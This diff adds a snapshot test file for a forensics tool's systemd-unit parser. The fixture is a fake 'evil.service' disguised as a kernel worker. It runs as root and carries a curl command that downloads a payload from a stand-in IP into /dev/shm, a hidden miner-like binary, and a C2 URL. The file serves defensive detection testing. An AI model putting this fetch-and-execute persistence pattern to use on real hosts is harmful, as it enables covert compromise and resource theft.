@@ -1,0 +1,5 @@
+---
+source: crates/nixcavate-artifacts/src/linux/systemd_units.rs
+expression: "unit(\"evil.service\", \"etc/systemd/system/evil.service\")"
+---
+{"host":"memory","artifact":"systemd-units","source_path":"etc/systemd/system/evil.service","source_line":null,"unit":"evil.service","drop_in":false,"unit_type":"service","description":"Kernel Worker Helper","exec_start":"/usr/local/lib/.kworker --pool 203.0.113.9:3333","exec_start_pre":"/bin/sh -c 'curl -fsSL http://198.51.100.7/stage1 -o /dev/shm/.k && chmod +x /dev/shm/.k'","exec_start_post":null,"exec_stop":null,"exec_stop_post":"/bin/rm -f /dev/shm/.k","exec_condition":null,"exec_reload":null,"run_user":"root","run_group":null,"working_directory":"/var/tmp","environment":"\"C2=http://198.51.100.7:8080\" \"KEY=abc\"","environment_file":null,"wanted_by":"multi-user.target","required_by":null,"also":null,"on_calendar":null,"on_boot_sec":null,"on_active_sec":null,"on_startup_sec":null,"on_unit_active_sec":null,"timer_unit":null,"activates":null,"listen":null,"path_triggers":null,"restart":"always","service_type":"simple","modified":"2023-11-14T22:13:20Z"}
